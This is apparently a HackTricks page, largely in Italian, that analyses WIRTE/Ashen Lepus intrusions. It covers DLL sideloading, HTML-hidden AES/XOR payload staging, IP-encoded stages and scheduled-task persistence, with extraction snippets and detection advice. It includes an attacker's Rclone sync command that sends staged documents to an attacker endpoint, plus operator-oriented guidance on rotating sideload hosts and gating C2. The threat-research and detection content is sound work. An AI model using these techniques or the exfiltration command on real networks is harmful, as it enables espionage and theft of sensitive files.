# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica del tradecraft

Ashen Lepus (aka WIRTE) ha weaponized un pattern ripetibile che concatena DLL sideloading, staged HTML payloads e backdoor modulari .NET per persistere all’interno di reti diplomatiche del Medio Oriente. La tecnica è riutilizzabile da qualsiasi operator perché si basa su:

- **Ingegneria sociale basata su archivi**: PDF innocui istruiscono i target a scaricare un archivio RAR da un file-sharing site. L’archivio include un EXE viewer di documenti dall’aspetto reale, una DLL malevola nominata come una libreria trusted (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e un `Document.pdf` esca.
- **Abuso dell’ordine di ricerca DLL**: la vittima fa doppio click sull’EXE, Windows risolve l’import della DLL dalla current directory, e il malicious loader (AshenLoader) viene eseguito all’interno del trusted process mentre il PDF esca si apre per evitare sospetti.
- **Living-off-the-land staging**: ogni fase successiva (AshenStager → AshenOrchestrator → modules) viene mantenuta fuori dal disco finché non serve, consegnata come blob encrypted nascosti all’interno di risposte HTML altrimenti innocue.

## Catena multi-stage di Side-Loading

1. **EXE esca → AshenLoader**: l’EXE side-loads AshenLoader, che esegue host recon, lo cifra con AES-CTR, e lo POSTa all’interno di parametri variabili come `token=`, `id=`, `q=`, o `auth=` verso path dall’aspetto API (e.g., `/api/v2/account`).
2. **Estrazione HTML**: il C2 tradisce il next stage solo quando l’IP del client si geolocalizza nella regione target e il `User-Agent` corrisponde all’implant, frustrando le sandbox. Quando i controlli passano il body HTTP contiene un blob `<headerp>...</headerp>` con il payload Base64/AES-CTR encrypted di AshenStager.
3. **Secondo sideload**: AshenStager viene distribuito con un altro binary legittimo che importa `wtsapi32.dll`. La copia malevola injected nel binary recupera altro HTML, questa volta estraendo `<article>...</article>` per recuperare AshenOrchestrator.
4. **AshenOrchestrator**: un controller .NET modulare che decodifica una config JSON in Base64. I campi `tg` e `au` della config vengono concatenati/hashati nella AES key, che decrypts `xrk`. I bytes risultanti agiscono come una XOR key per ogni module blob recuperato successivamente.
5. **Consegna dei moduli**: ogni modulo è descritto tramite commenti HTML che reindirizzano il parser verso un tag arbitrario, rompendo regole statiche che guardano solo a `<headerp>` o `<article>`. I moduli includono persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) e file exploration (`FE`).

### Pattern di parsing del container HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Anche se i difensori bloccano o rimuovono un elemento specifico, l’operatore deve solo cambiare il tag suggerito nel commento HTML per riprendere la consegna.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Recent HTML smuggling research (Talos) highlights payloads hidden as Base64 strings inside `<script>` blocks in HTML attachments and decoded via JavaScript at runtime. The same trick can be reused for C2 responses: stage encrypted blobs inside a script tag (or other DOM element) and decode them in-memory before AES/XOR, making the page look like ordinary HTML. Talos also shows layered obfuscation (identifier renaming plus Base64/Caesar/AES) inside script tags, which maps cleanly to HTML-staged C2 blobs. A later Talos writeup on **hidden text salting** is also relevant here: splitting Base64 with irrelevant HTML comments or whitespace is enough to break simple regex extractors while keeping browser-side reconstruction trivial.

## Recent Variant Notes (2024-2025)

- Check Point observed WIRTE campaigns in 2024 that still hinged on archive-based sideloading but used `propsys.dll` (stagerx64) as the first stage. The stager decodes the next payload with Base64 + XOR (key `53`), sends HTTP requests with a hardcoded `User-Agent`, and extracts encrypted blobs embedded between HTML tags. In one branch, the stage was reconstructed from a long list of embedded IP strings decoded via `RtlIpv4StringToAddressA`, then concatenated into the payload bytes.
- OWN-CERT documented earlier WIRTE tooling where the side-loaded `wtsapi32.dll` dropper protected strings with Base64 + TEA and used the DLL name itself as the decryption key, then XOR/Base64-obfuscated host identification data before sending it to the C2.

## Reconstructing IP-Encoded Stages

WIRTE's 2024 `propsys.dll` branch shows that the next PE does not need to live as one contiguous HTML blob. The loader can stash stage bytes as dotted-quad strings and rebuild them with `RtlIpv4StringToAddressA`, a pattern closely related to Hive's **IPfuscation** tradecraft. Operationally this is useful when the actor wants the HTML page to contain what looks like harmless IOCs or config data instead of an obvious Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Se i byte recuperati iniziano con `MZ`, probabilmente hai ricostruito direttamente il PE successivo. In caso contrario, controlla un livello XOR/Base64 iniziale o piccoli chunk delimitatori tra gli indirizzi.

## Nomi DLL intercambiabili e rotazione dell'host

Una proprietà forte di questo pattern è che il **backend di staging HTML/AES/XOR può restare identico mentre cambia solo la coppia di sideload**. WIRTE ha ruotato tra `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` e `propsys.dll` tra diverse campagne, il che è utile perché:

- `propsys.dll` e `wtsapi32.dll` sono nomi DLL Windows poco interessanti che i defender si aspettano di trovare in `%System32%` / `%SysWOW64%`.
- Cataloghi pubblici come **HijackLibs** già mappano molti binari che caricheranno quei nomi DLL da una directory applicativa copiata, offrendo agli operatori host sostitutivi senza riprogettare lo stager.
- Solo la superficie di export deve essere adattata per ogni host. Il parser HTML, le routine AES/XOR e il loader del modulo possono di solito essere trapiantati invariati in una DLL proxy di forwarding.

Per il lavoro offensivo in lab, questo significa che puoi separare il problema in **(1) trovare un host firmato stabile che risolva localmente il nome DLL scelto** e **(2) riusare la stessa logica del loader HTML staged dietro quella DLL**.

## Rafforzamento di crypto e C2

- **AES-CTR ovunque**: i loader attuali incorporano chiavi a 256 bit più nonce (ad es. `{9a 20 51 98 ...}`) e, opzionalmente, aggiungono un livello XOR usando stringhe come `msasn1.dll` prima/dopo la decryption.
- **Variazioni del materiale chiave**: i loader precedenti usavano Base64 + TEA per proteggere le stringhe incorporate, con la chiave di decryption derivata dal nome della DLL malevola (ad es. `wtsapi32.dll`).
- **Separazione dell’infrastructure + camuffamento dei subdomain**: i server di staging sono separati per tool, ospitati su ASN diversi e talvolta frontati da subdomain dall’aspetto legittimo, così bruciare uno stage non espone il resto.
- **Smuggling di recon**: i dati enumerati ora includono elenchi di Program Files per individuare applicazioni di alto valore e vengono sempre criptati prima di lasciare l’host.
- **Rotazione degli URI**: i parametri di query e i path REST ruotano tra campagne (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando le detection fragili.
- **User-Agent pinning + redirect sicuri**: l’infrastructure C2 risponde solo a stringhe UA esatte e altrimenti reindirizza verso siti benigni di news/health per mimetizzarsi.
- **Consegna gated**: i server sono geo-fenced e rispondono solo a veri implant. I client non approvati ricevono HTML non sospetto.

## Persistence e ciclo di esecuzione

AshenStager crea scheduled task che si mascherano da job di manutenzione Windows ed eseguono tramite `svchost.exe`, ad es.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Questi task rilanciano la catena di sideloading all’avvio o a intervalli, garantendo che AshenOrchestrator possa richiedere nuovi moduli senza toccare di nuovo il disco.

## Uso di client di sync benigni per l’exfiltration

Gli operatori collocano documenti diplomatici dentro `C:\Users\Public` (leggibile da tutti e non sospetto) tramite un modulo dedicato, poi scaricano il binario legittimo [Rclone](https://rclone.org/) per sincronizzare quella directory con lo storage dell’attaccante. Unit42 osserva che questa è la prima volta che questo actor è stato visto usare Rclone per l’exfiltration, in linea con la tendenza più ampia ad abusare di strumenti di sync legittimi per confondersi nel traffico normale:

1. **Stage**: copia/raccogli i file target in `C:\Users\Public\{campaign}\`.
2. **Configura**: invia una config Rclone che punti a un endpoint HTTPS controllato dall’attaccante (ad es. `api.technology-system[.]com`).
3. **Sync**: esegui `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` così il traffico assomiglia a normali backup cloud.

Poiché Rclone è ampiamente usato per workflow di backup legittimi, i defender devono concentrarsi su esecuzioni anomale (nuovi binari, remote insoliti o sincronizzazione improvvisa di `C:\Users\Public`).

## Punti di detection

- Allerta su **processi firmati** che caricano in modo inaspettato DLL da path scrivibili dall’utente (filtri Procmon + `Get-ProcessMitigation -Module`), soprattutto quando i nomi DLL coincidono con `netutils`, `srvcli`, `dwampi`, `wtsapi32` o `propsys`.
- Ispeziona le risposte HTTPS sospette per **grandi blob Base64 incorporati dentro tag insoliti** o protetti da commenti `<!-- TAG: <xyz> -->`.
- Normalizza prima l’HTML: **rimuovi i commenti e compatta gli spazi prima dell’estrazione Base64**, perché l’evasione in stile hidden-text-salting può spezzare i payload attraverso i confini dei commenti.
- Estendi il hunting HTML a **stringhe Base64 dentro blocchi `<script>`** (staging in stile HTML smuggling) che vengono decodificate via JavaScript prima del processing AES/XOR.
- Cerca chiamate ripetute a **`RtlIpv4StringToAddressA` seguite da assembly di buffer**, soprattutto quando le stringhe circostanti sono lunghe liste IPv4 e non veri target di rete.
- Cerca **scheduled task** che eseguono `svchost.exe` con argomenti non-service o che puntano di nuovo a directory di dropper.
- Traccia i **redirect C2** che restituiscono payload solo per stringhe `User-Agent` esatte e altrimenti rimbalzano verso domini legittimi di news/health.
- Monitora la comparsa di binari **Rclone** fuori da posizioni gestite dall’IT, nuovi file `rclone.conf` o job di sync che leggono da directory di staging come `C:\Users\Public`.

## Riferimenti

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
